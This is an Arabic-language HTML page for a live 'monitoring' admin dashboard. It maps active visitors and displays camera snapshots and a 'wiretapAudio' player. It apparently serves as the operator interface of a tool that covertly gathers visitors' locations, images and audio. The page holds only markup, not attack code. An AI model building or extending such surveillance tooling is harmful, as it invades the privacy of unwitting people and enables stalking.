<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>لوحة التحكم | Live Admin Dashboard</title>
    
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;700&family=Tajawal:wght@400;500;700;800&display=swap" rel="stylesheet">
    
    <!-- Leaflet CSS -->
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" crossorigin=""/>
    
    <!-- Admin CSS -->
    <link rel="stylesheet" href="admin.css">
</head>
<body>

    <div class="admin-layout">
        <!-- Sidebar -->
        <aside class="sidebar">
            <div class="sidebar-header">
                <h2>لوحة المراقبة 🛰️</h2>
                <p>متابعة مباشرة للزوار</p>
                <div class="status-indicator">
                    <div class="pulse-dot"></div>
                    <span>متصل بالخادم</span>
                </div>
            </div>

            <div class="users-list-container">
                <h3>المستخدمين النشطين (<span id="activeCount">0</span>)</h3>
                <ul id="usersList" class="users-list">
                    <!-- User items will be injected here -->
                </ul>
            </div>
        </aside>

        <!-- Main Map Area -->
        <main class="map-container">
            <div id="adminMap"></div>
        </main>
    </div>

    <!-- Media Modal -->
    <div id="mediaModal" class="modal hidden">
        <div class="modal-content">
            <span class="close-btn" id="closeModal">&times;</span>
            <h3 id="mediaTitle">--</h3>
            
            <div class="media-container">
                <img id="snapshotImage" src="" alt="لقطة كاميرا" class="hidden">
                <div id="audioContainer" class="hidden" style="padding: 2rem; background: #1e293b; border-radius: 8px;">
                    <audio id="wiretapAudio" controls></audio>
                </div>
            </div>
        </div>
    </div>

    <!-- Socket.IO -->
    <script src="/socket.io/socket.io.js"></script>
    <!-- Leaflet JS -->
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js" crossorigin=""></script>
    
    <!-- Admin JS -->
    <script src="admin.js"></script>
</body>
</html>
